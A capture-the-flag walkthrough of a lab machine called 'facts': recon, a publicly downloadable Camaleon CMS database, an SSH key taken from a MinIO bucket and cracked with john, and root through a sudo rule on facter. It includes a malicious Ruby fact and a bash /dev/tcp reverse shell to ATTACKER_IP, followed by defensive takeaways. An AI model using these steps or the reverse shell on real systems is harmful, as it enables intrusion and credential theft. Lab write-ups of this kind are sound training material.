Section 02

Recon & Enumeration

01
Port Scanning
NMAP · Service Discovery

A targeted nmap scan covering the three open ports reveals SSH on 22, nginx on 80 (redirecting to facts.htb), and a MinIO S3 server on 54321 that redirects to a web console on port 9001. The hostname is added to /etc/hosts before proceeding.

bash
nmap -sC -sV -p 22,80,54321 -oA targeted 10.129.223.195

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: facts
54321/tcp open  http    Golang net/http server (MinIO S3)
|_http-title: Did not follow redirect to http://facts.htb:9001

echo "10.129.223.195 facts.htb" >> /etc/hosts
◈
Observation: Port 54321 is MinIO — an S3-compatible object store. Combined with a web CMS on port 80, this suggests the CMS uses MinIO as a file storage backend, which is an interesting attack surface.
02
Web Application Enumeration
Feroxbuster · Camaleon CMS 2.9.0

Browsing to http://facts.htb/ reveals Camaleon CMS v2.9.0 — a Ruby on Rails CMS — running a trivia-style facts application. Directory fuzzing uncovers the admin panel at /admin/login and confirms the media path /randomfacts/ which is proxied by nginx to the MinIO S3 bucket of the same name.

bash
feroxbuster -u http://facts.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-Easy-directories.txt

200  GET  /admin/login
200  GET  /randomfacts/
⚠
Misconfiguration: The nginx reverse proxy exposes the entire randomfacts S3 bucket contents — including application files — at a predictable public URL with no authentication required.
03
SQLite Database Exposure
Critical Discovery · Unauthenticated DB Download

Camaleon CMS stores its SQLite database at a predictable path within the application directory. Because nginx proxies the S3 bucket at /randomfacts/, the production database file is directly downloadable — no authentication needed.

bash
# Download the full production SQLite database
curl http://facts.htb/randomfacts/db/production.sqlite3 -o production.sqlite3
✕
Critical: The entire production database — containing user credentials, S3 secrets, admin tokens, and all CMS configuration — is publicly accessible via a simple HTTP GET with no authentication or rate-limiting.

sqlite3 · cama_metas · cama_users

The downloaded SQLite database contains the full CMS configuration. Querying the cama_metas table for S3-related entries yields the MinIO access/secret key pair, bucket name, and endpoint. The cama_users table also exposes the admin auth token.

06
Retrieve & Crack SSH Private Key
aws-cli · ssh2john · John The Ripper

The SSH private key for user trivia is downloaded from the internal bucket. The key is passphrase-protected. Using ssh2john to convert it to a crackable hash and then running john against rockyou.txt recovers the passphrase instantly.

bash
# Download the SSH private key from internal bucket
aws --endpoint-url http://10.129.223.195:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519

# Convert key to crackable hash
ssh2john ./id_ed25519 > ssh_hash.txt

# Crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Press 'q' or Ctrl-C to abort ...

dragonballz      (./id_ed25519)
✓
Passphrase Cracked: SSH key passphrase is dragonballz — found in rockyou.txt. Weak passphrases on SSH keys stored in backup locations are trivially exploitable.
07
SSH Access as trivia
Shell · uid=1000

With the passphrase in hand, the private key permissions are set correctly and a shell is established as the trivia user. The user flag is not in trivia's home directory but in /home/william/user.txt, which is world-readable.

bash
# Strip passphrase for convenience (optional)
ssh-keygen -p -P "dragonballz" -N "" -f ./id_ed25519
chmod 600 ./id_ed25519

# Establish shell
ssh -i ./id_ed25519 trivia@10.129.223.195

Section 04

Privilege Escalation

08
Sudo Enumeration — facter
sudo -l · GTFOBins

Running sudo -l as trivia reveals a dangerous sudo rule: the user can run /usr/bin/facter as any user (including root) without supplying a password. Facter is a Puppet system profiling tool that supports loading custom facts written in Ruby via the --custom-dir flag — a well-documented GTFOBins vector for arbitrary code execution.

bash
sudo -l

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
✕
Critical: Granting unrestricted sudo NOPASSWD on facter is equivalent to giving root access. Any tool supporting plugin/extension loading (facter, puppet, ansible, etc.) must never appear in a sudo rule without strict argument constraints.
09
Arbitrary Ruby Execution via Custom Fact
facter --custom-dir · Root Shell

A malicious Ruby "fact" is written to a temporary directory. When Facter loads it via --custom-dir under sudo, the embedded Ruby code executes as root. The root flag is read directly; alternatively, a full reverse shell can be spawned.

bash
# Create the custom facts directory
mkdir -p /tmp/facts.d

# Write a malicious Ruby custom fact to read root flag
cat > /tmp/facts.d/root.rb << 'EOF'
Facter.add('root_flag') do
  setcode do
    require 'open3'
    stdout, stderr, status = Open3.capture3('cat /root/root.txt')
    stdout.strip
  end
end
EOF

# Execute as root via sudo
sudo /usr/bin/facter --custom-dir /tmp/facts.d root_flag
◈
Technique: GTFOBins — Facter's --custom-dir loads .rb files and executes their setcode blocks during fact resolution. Under sudo, this becomes root-level arbitrary Ruby execution with no sandbox or restriction.
optional — full root shell
bash
# Attacker: start listener
nc -lvnp 4444

# On target: write reverse shell fact
cat > /tmp/facts.d/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    require 'open3'
    Open3.capture3('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
  end
end
EOF

sudo /usr/bin/facter --custom-dir /tmp/facts.d shell

key takeaways
01 // WEB SERVER CONFIG
Database Files in Web-Accessible Storage
Camaleon CMS stores its SQLite database within the application directory. When the S3 backend is proxied through nginx at a predictable public URL, the database becomes downloadable by any unauthenticated user. Always use deny rules or separate storage paths to prevent database files from being served over HTTP.
02 // IAM POLICY
S3 Least-Privilege Enforcement
The single set of S3 credentials used for public media also granted full access to a sensitive internal bucket containing SSH private keys. IAM policies should scope each key pair to only the specific buckets and actions it requires — no more, no less.
03 // SECRETS MANAGEMENT
SSH Keys Must Never Be Backed Up to Shared Storage
Including the .ssh/ directory in a home-directory backup that is uploaded to S3 with shared credentials is a critical error. SSH private keys should be excluded from backup procedures, and secrets should be managed through dedicated vaults (HashiCorp Vault, AWS Secrets Manager, etc.).
04 // PASSWORD POLICY
Weak SSH Key Passphrases
The passphrase dragonballz was cracked in seconds using rockyou.txt. SSH key passphrases should be treated as passwords: long, random, and unique. Hardware-backed keys (YubiKey, FIDO2) eliminate the passphrase attack surface entirely.
05 // SUDO HARDENING
Dangerous sudo Rules on Extension-Loading Tools
Granting NOPASSWD: /usr/bin/facter without restricting arguments is functionally equivalent to granting a root shell. Tools that support plugin or custom-script loading (Facter, Puppet, Ansible, etc.) must never appear in sudo rules without tight argument constraints enforced by sudoers command specs.
06 // FILE PERMISSIONS
World-Readable Flag Files and Home Directories
The user flag in /home/william/user.txt was world-readable, accessible without compromising william's account. Sensitive files should be owned by the appropriate user with permissions set to 600 or 640 at most — never world-readable unless intentionally public.
